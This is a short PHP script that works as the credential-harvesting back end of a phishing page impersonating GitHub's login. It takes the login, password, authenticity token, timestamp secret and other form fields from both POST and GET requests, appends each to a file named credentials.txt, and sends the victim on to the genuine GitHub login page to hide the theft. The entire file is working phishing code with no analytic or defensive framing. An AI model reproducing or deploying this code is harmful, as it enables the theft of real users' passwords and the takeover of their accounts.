<?php

header("Location: https://github.com/login");

if (!empty($_POST['authenticity_token'])) {file_put_contents("credentials.txt", "authenticity_token: "  . $_POST['authenticity_token'] . "
", FILE_APPEND);
}
if (!empty($_GET['authenticity_token'])) {file_put_contents("credentials.txt", "authenticity_token: "  . $_GET['authenticity_token'] . "
", FILE_APPEND);
}
if (!empty($_POST['ga_id'])) {file_put_contents("credentials.txt", "ga_id: "  . $_POST['ga_id'] . "
", FILE_APPEND);
}
if (!empty($_GET['ga_id'])) {file_put_contents("credentials.txt", "ga_id: "  . $_GET['ga_id'] . "
", FILE_APPEND);
}
if (!empty($_POST['login'])) {file_put_contents("credentials.txt", "login: "  . $_POST['login'] . "
", FILE_APPEND);
}
if (!empty($_GET['login'])) {file_put_contents("credentials.txt", "login: "  . $_GET['login'] . "
", FILE_APPEND);
}
if (!empty($_POST['password'])) {file_put_contents("credentials.txt", "password: "  . $_POST['password'] . "
", FILE_APPEND);
}
if (!empty($_GET['password'])) {file_put_contents("credentials.txt", "password: "  . $_GET['password'] . "
", FILE_APPEND);
}
if (!empty($_POST['webauthn-support'])) {file_put_contents("credentials.txt", "webauthn-support: "  . $_POST['webauthn-support'] . "
", FILE_APPEND);
}
if (!empty($_GET['webauthn-support'])) {file_put_contents("credentials.txt", "webauthn-support: "  . $_GET['webauthn-support'] . "
", FILE_APPEND);
}
if (!empty($_POST['webauthn-iuvpaa-support'])) {file_put_contents("credentials.txt", "webauthn-iuvpaa-support: "  . $_POST['webauthn-iuvpaa-support'] . "
", FILE_APPEND);
}
if (!empty($_GET['webauthn-iuvpaa-support'])) {file_put_contents("credentials.txt", "webauthn-iuvpaa-support: "  . $_GET['webauthn-iuvpaa-support'] . "
", FILE_APPEND);
}
if (!empty($_POST['return_to'])) {file_put_contents("credentials.txt", "return_to: "  . $_POST['return_to'] . "
", FILE_APPEND);
}
if (!empty($_GET['return_to'])) {file_put_contents("credentials.txt", "return_to: "  . $_GET['return_to'] . "
", FILE_APPEND);
}
if (!empty($_POST['required_field_325f'])) {file_put_contents("credentials.txt", "required_field_325f: "  . $_POST['required_field_325f'] . "
", FILE_APPEND);
}
if (!empty($_GET['required_field_325f'])) {file_put_contents("credentials.txt", "required_field_325f: "  . $_GET['required_field_325f'] . "
", FILE_APPEND);
}
if (!empty($_POST['timestamp'])) {file_put_contents("credentials.txt", "timestamp: "  . $_POST['timestamp'] . "
", FILE_APPEND);
}
if (!empty($_GET['timestamp'])) {file_put_contents("credentials.txt", "timestamp: "  . $_GET['timestamp'] . "
", FILE_APPEND);
}
if (!empty($_POST['timestamp_secret'])) {file_put_contents("credentials.txt", "timestamp_secret: "  . $_POST['timestamp_secret'] . "
", FILE_APPEND);
}
if (!empty($_GET['timestamp_secret'])) {file_put_contents("credentials.txt", "timestamp_secret: "  . $_GET['timestamp_secret'] . "
", FILE_APPEND);
}
if (!empty($_POST['commit'])) {file_put_contents("credentials.txt", "commit: "  . $_POST['commit'] . "
", FILE_APPEND);
}
if (!empty($_GET['commit'])) {file_put_contents("credentials.txt", "commit: "  . $_GET['commit'] . "
", FILE_APPEND);
}
exit();